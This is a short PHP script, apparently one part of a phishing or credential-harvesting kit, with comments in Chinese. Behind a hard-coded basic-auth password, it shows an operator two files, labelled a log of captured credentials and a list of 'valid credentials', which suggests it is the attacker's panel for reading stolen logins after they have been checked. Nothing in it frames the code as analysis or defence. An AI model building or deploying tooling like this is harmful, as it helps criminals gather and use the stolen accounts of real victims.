# 文件名: monitor.php (监控捕获日志)
<?php
// 简单实时查看日志（需密码保护）
$auth_user = 'admin';
$auth_pass = 'your_secure_password';
if (!isset($_SERVER['PHP_AUTH_USER']) || $_SERVER['PHP_AUTH_USER'] != $auth_user || $_SERVER['PHP_AUTH_PW'] != $auth_pass) {
    header('WWW-Authenticate: Basic realm="Logs"');
    header('HTTP/1.0 401 Unauthorized');
    exit;
}
echo "<pre>";
echo "=== CREDENTIALS LOG ===\n";
if (file_exists('logs.txt')) {
    echo htmlspecialchars(file_get_contents('logs.txt'));
} else {
    echo "No logs yet.";
}
echo "\n\n=== VALID CREDENTIALS ===\n";
if (file_exists('valid.txt')) {
    echo htmlspecialchars(file_get_contents('valid.txt'));
} else {
    echo "No valid credentials.";
}
echo "</pre>";
?>